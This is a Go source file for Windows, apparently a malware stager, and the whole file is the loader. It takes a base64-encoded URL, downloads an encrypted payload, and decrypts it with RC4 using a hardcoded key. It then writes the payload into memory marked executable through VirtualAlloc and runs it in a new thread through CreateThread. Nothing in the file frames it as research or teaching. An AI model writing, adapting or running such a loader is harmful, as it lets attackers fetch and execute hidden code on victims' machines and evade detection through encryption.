package main

import (
	"encoding/base64"
	"fmt"
	"io/ioutil"
	"log"
	"net/http"
	"os"
	"unsafe"

	"golang.org/x/sys/windows"
)

var (
	kernel32                = windows.NewLazySystemDLL("kernel32.dll")
	procVirtualAlloc        = kernel32.NewProc("VirtualAlloc")
	procCreateThread        = kernel32.NewProc("CreateThread")
	procWaitForSingleObject = kernel32.NewProc("WaitForSingleObject")
	procRtlMoveMemory       = kernel32.NewProc("RtlMoveMemory")
)

func downloadPayload(url string) ([]byte, error) {
	resp, err := http.Get(url)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		return nil, fmt.Errorf("unexpected status code: %d", resp.StatusCode)
	}

	payload, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		return nil, err
	}

	return payload, nil
}

func obfuscatedDecrypt(data []byte, key []byte) {
	i, j := 0, 0
	S := make([]byte, 256)
	T := make([]byte, 256)

	for i := 0; i < 256; i++ {
		S[i] = byte(i)
		T[i] = key[i%len(key)]
	}

	j = 0
	for i := 0; i < 256; i++ {
		j = (j + int(S[i]) + int(T[i])) % 256
		S[i], S[j] = S[j], S[i]
	}

	i, j = 0, 0
	for n := 0; n < len(data); n++ {
		i = (i + 1) % 256
		j = (j + int(S[i])) % 256
		S[i], S[j] = S[j], S[i]
		k := S[(int(S[i])+int(S[j]))%256]
		data[n] ^= k
	}
}

func executeShellcode(shellcode []byte) error {
	ptr, _, err := procVirtualAlloc.Call(0, uintptr(len(shellcode)), windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_EXECUTE_READWRITE)
	if err != nil && err.Error() != "The operation completed successfully." {
		return err
	}

	src := uintptr(unsafe.Pointer(&shellcode[0]))
	dst := uintptr(ptr)
	size := uintptr(len(shellcode))
	_, _, err = procRtlMoveMemory.Call(dst, src, size)
	if err != nil && err.Error() != "The operation completed successfully." {
		return err
	}

	var threadID uint32
	threadHandle, _, err := procCreateThread.Call(0, 0, dst, 0, 0, uintptr(unsafe.Pointer(&threadID)))
	if err != nil && err.Error() != "The operation completed successfully." {
		return err
	}

	_, _, err = procWaitForSingleObject.Call(threadHandle, windows.INFINITE)
	if err != nil && err.Error() != "The operation completed successfully." {
		return err
	}

	return nil
}

func main() {
	if len(os.Args) != 2 {
		fmt.Println("Usage: ", os.Args[0], "<base64_encoded_url>")
		return
	}

	encodedURL := os.Args[1]
	decodedURL, err := base64.StdEncoding.DecodeString(encodedURL)
	if err != nil {
		log.Fatalf("Failed to decode base64 URL: %v\n", err)
	}

	payload, err := downloadPayload(string(decodedURL))
	if err != nil {
		log.Fatalf("Failed to download payload: %v\n", err)
	}

	key := []byte("thisIsA16ByteKey")

	obfuscatedDecrypt(payload, key)

	err = executeShellcode(payload)
	if err != nil {
		log.Fatalf("Failed to execute shellcode: %v\n", err)
	}

	fmt.Println("Shellcode executed successfully.")
}
